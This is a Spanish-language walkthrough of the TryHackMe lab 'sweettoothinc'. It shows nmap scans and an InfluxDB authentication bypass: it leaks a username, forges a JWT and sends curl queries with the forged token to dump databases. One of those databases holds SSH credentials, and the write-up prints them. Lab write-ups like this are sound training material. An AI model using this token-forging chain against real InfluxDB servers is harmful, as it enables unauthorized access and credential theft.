---
title: "sweettoothinc"
description: "sweettoothinc"
pubDate: 2025-05-20
---

https://tryhackme.com/r/room/sweettoothinc

# Fase de reconocimiento

## Buscar puertos abiertos

````
nmap -sS -p- -T5 --min-rate=5000 -vvv -Pn -n 10.10.113.250
````



## Reconocimiento de servicios

````
nmap -sCV -p111,2222,8086,50589 10.10.113.250
````



# Fase de ataque

Encontramos un 0day en InfluxDB reportado que consiste en lo siguiente:

1. Conseguimos el usuario

````
curl -k -X POST http://10.10.113.250:8086/debug/requests
````


2. Generating the token (JWT)
https://jwt.io

Ponemos el usuario y la fecha que no caduque epoch https://www.unixtimestamp.com/index.php?ref=unhackable.lol
3. Mandamos el Token para autenticarnos y hacer queries

````
curl -G -X POST 'http:/10.10.113.250:8086/query' --data-urlencode 'q=show users' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzE5MzU2NDM0fQ.2F_YbVAe08xLx0d6m1HHtiltDCVfQoyO3McKSBpaAF8'
````



````
curl -G -X POST 'http:/10.10.113.250:8086/query?db=tanks' --data-urlencode 'q=SELECT * FROM water_tank' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzE5MzU2NDM0fQ.2F_YbVAe08xLx0d6m1HHtiltDCVfQoyO3McKSBpaAF8' 
````

````
curl -G -X POST 'http:/10.10.113.250:8086/query?db=mixer' --data-urlencode 'q=SELECT MAX(motor_rpm) FROM mixer_stats' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzE5MzU2NDM0fQ.2F_YbVAe08xLx0d6m1HHtiltDCVfQoyO3McKSBpaAF8'
````

````
curl -G -X POST 'http:/10.10.113.250:8086/query?db=creds' --data-urlencode 'q=SELECT * FROM ssh' -H 'Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Im81eVk2eXlhIiwiZXhwIjoxNzE5MzU2NDM0fQ.2F_YbVAe08xLx0d6m1HHtiltDCVfQoyO3McKSBpaAF8'
````


Tenemos el usuario y contraseña de un usuario

Nos conectamos por ssh
7788764472    uzJk6Ry98d8C
